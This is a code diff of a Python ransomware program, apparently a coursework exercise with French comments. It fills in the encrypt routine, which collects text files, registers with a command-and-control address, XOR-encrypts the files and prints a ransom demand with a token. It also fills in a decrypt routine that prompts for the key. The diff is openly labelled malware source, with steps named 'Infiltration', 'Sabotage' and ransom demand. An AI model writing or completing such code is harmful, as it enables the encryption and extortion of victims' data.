@@ -5,10 +5,11 @@ import sys
 import os
 from pathlib import Path
 import pathlib
+import secret_manager
 
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-#from secret_manager import SecretManager
+from secret_manager import SecretManager
 
 
 CNC_ADDRESS = "cnc:6666"
@@ -49,13 +50,38 @@ class Ransomware:
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        files = self.get_files("*txt")
+        #Infiltration
+        secret_manager = SecretManager(CNC_ADDRESS,TOKEN_PATH)
+        #Mise en place des outils
+        secret_manager.setup()
+        #Sabotage des donnees
+        secret_manager.xorfiles()
+        #Demande de rancon
+        hex_token = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token=hex_token))
+
+
 
     def decrypt(self):
         # main function for decrypting (see PDF)
+        #Recuperation des donnees 
+        secret_manager = SecretManager(CNC_ADDRESS,TOKEN_PATH)
+        secret_manager.load()
+        received_files = self.get_files("*.txt")
+        while True:
+            try:
+                trial_key = input("Clé de dechiffrement")
+                secret_manager.set_key(trial_key)
+                secret_manager.xorfiles(received_files)
+                secret_manager.clean()
 
+                print("Dechiffrement reussi, à plus ^^")
+                break
+            except ValueError as error:
+                print("Erreur", {error},"Pas la bonne cle ")
         
-        raise NotImplemented()
+        
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
